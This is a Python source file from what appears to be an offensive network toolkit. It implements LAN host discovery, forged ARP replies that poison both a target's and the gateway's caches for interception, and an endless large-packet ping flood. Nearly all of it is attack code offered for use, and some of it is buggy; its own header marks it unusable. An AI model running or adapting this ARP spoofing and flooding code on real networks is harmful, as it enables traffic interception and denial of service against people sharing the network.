'''
 *@author:wr
 *@GitHub:https://github.com/wr0x00/Lizard
 *@date:2022.8.2
 *@description: ARP攻击功能
'''
#!/usr/bin/python3
'''[!]'''
'''[!]can't use'''
'''[!]'''
from scapy.all import *
import threading
import uuid
import os
class exp:
    def ping(attackIP):
        count = 1
        while True:
            cmd = "ping %s -l 65500" % attackIP
            print(cmd)
            result = os.system(cmd)
            print(result)
            print("Sent", count)
            count += 1
    
    
    def gateway_mac_1(self,gateway_ip):
        try:
            gateway_mac_2 = self.getmacbyip(gateway_ip)
            return gateway_mac_2
        except:
            print('[-]请检查网关MAC是否存活')
    
    
    def get_mac(self,Target_IP):
        try:
            tgtMac = self.getmacbyip(Target_IP)
            return tgtMac
        except:
            print('[-]请检查目标IP是否存活')
    
    
    def get_mac_address():
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        return ":".join([mac[e:e + 2] for e in range(0, 11, 2)])
    
    
    def host_discovery(host_computer):
        IpScan = host_computer + '/24'
        try:
            ans, unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(pdst=IpScan), timeout=2)
        except Exception as opp:
            print(opp)
        else:
            print("[%d] LAN survived" % (len(ans)))
            print("  MAC address               IP address")
            print("                                      ")
            for send, rcv in ans:
                ListMACAddr = rcv.sprintf("%Ether.src% ----------- %ARP.psrc%")
                print(ListMACAddr)
    
    
    def host_arp_spoofing(native_mac, target_mac, gateway_ip, Target_ip):
        data_packet = Ether(src=native_mac, dst=target_mac) / ARP(hwsrc=native_mac, psrc=gateway_ip, hwdst=target_mac,
                                                                  pdst=Target_ip, op=2)
        return data_packet
    
    
    def gateway_arp_spoofing(native_mac, gateway_mac, gateway_ip, Target_ip):
        data_packet = Ether(src=native_mac, dst=gateway_mac) / ARP(hwsrc=native_mac, psrc=Target_ip, hwdst=gateway_mac,
                                                                   pdst=gateway_ip, op=2)
        return data_packet
    def __init__(self,Target_ip,gateway_ip):
        print("\033[1;32mSelect mode!\033[0m") #选择模式
        pattern = input('\033[1;31m[*]\033[0m==>')
        if pattern == 'h':
            print('Please enter local v4ip') #输入本机IP
            host_computer = input("\033[1;31m[*]\033[0m==>")
            wait_a_moment = input("\033[1;31m[.....]\033[0m press any key to continue")
            self.host_discovery(host_computer)
    
        if pattern == 'o':
            try:
                native_mac = self.get_mac_address()  # 本机Mac地址
                target_mac = self.get_mac(Target_ip)  # IP转Mac地址
                gateway_mac = self.gateway_mac_1(gateway_ip)  # 网关Mac地址
                print("The local MAC address is:", native_mac)
                print("The MAC address of the target computer is:", target_mac)
                print("The gateway IP address is:", gateway_ip)
                print("The gateway MAC address is:", gateway_mac)
            except:
                print("\033[1;31m[!]\033[0mPlease enter the correct parameters")
            try:
                print("Number of ARP attacks launched")
                frequency = input("Unlimited attack [y/n] default=[n]") #无限制攻击？
                implement = self.host_arp_spoofing(native_mac, target_mac, gateway_ip, Target_ip)
                gateway = self.gateway_arp_spoofing(native_mac, gateway_mac, gateway_ip, Target_ip)
                if frequency == 'y':
                    wait_a_moment_1 = input("\033[1;31m[.....]\033[0m press any key to continue")
                    count = 1
                    while True:
                        thread = threading.Thread(target=sendp, args=(implement,))
                        thread.start()
                        thread.join()
                        print("\033[1;36mSend [%d] computer ARP Spoofing packet\033[0m" % count)
                        thread_q = threading.Thread(target=sendp, args=(gateway,))
                        thread_q.start()
                        thread.join()
                        print("Send [%d] gateway ARP Spoofing packet" % count)
                        count += 1
                count_1 = 1
                if frequency == 'n':
                    wait_a_moment_2 = input("\033[1;31m[.....]\033[0m press any key to continue")
                    Setting_times = input("\033[1;31m[+]\033[0mEnter the number of cycles==>") # 输入循环数
                    for loop in range(int(Setting_times)):
                        thread = threading.Thread(target=sendp, args=(implement,))
                        thread.start()
                        thread.join()
                        print("\033[1;36mSend [%d] computer ARP Spoofing packet\033[0m" % count_1)
                        thread_q = threading.Thread(target=sendp, args=(gateway,))
                        thread_q.start()
                        thread.join()
                        print("Send [%d] gateway ARP Spoofing packet" % count_1)
                        count_1 += 1
            except:
                print('\033[1;31m[!]\033[0mPlease select the correct mode')
        if pattern == 'p':
            attackIP = input("\033[1;31m[*]\033[0Attack IP address===>")
            wait_a_moment_2 = input("\033[1;31m[.....]\033[0m Please press any key to continue")
            self.ping(attackIP)
    
